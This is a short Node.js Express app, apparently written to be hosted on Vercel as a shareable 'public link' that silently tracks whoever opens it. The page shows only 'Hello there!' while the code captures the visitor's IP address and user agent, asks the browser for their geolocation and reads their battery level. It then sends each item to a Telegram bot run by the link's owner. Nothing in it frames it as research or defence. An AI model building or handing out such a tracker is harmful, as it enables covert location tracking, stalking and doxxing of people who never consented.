const express = require('express');
const axios = require('axios');
const app = express();

const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).catch(err => console.error('Error sending message:', err));
};

// Main route — this is what your public link will show
app.get('/', (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let userAgent = req.headers['user-agent'];

  let script = `
    <script>
      navigator.getBattery().then(battery => {
        fetch('/battery?level=' + battery.level);
      });

      navigator.geolocation.getCurrentPosition(position => {
        fetch('/location?lat=' + position.coords.latitude + '&long=' + position.coords.longitude);
      });

      fetch('/user?id=' + navigator.userAgent);
    </script>
    <h1>Hello there!</h1>
  `;
  res.send(script);
  sendToTelegram('New visitor IP: ' + ip + '\nUser Agent: ' + userAgent);
});

// Battery route
app.get('/battery', (req, res) => {
  sendToTelegram('Battery Level: ' + req.query.level);
  res.send('Battery level received');
});

// Location route
app.get('/location', (req, res) => {
  sendToTelegram('Location: ' + req.query.lat + ', ' + req.query.long);
  res.send('Location received');
});

// User agent route
app.get('/user', (req, res) => {
  sendToTelegram('User Agent: ' + req.query.id);
  res.send('User info received');
});

// Export the app for Vercel
module.exports = app;
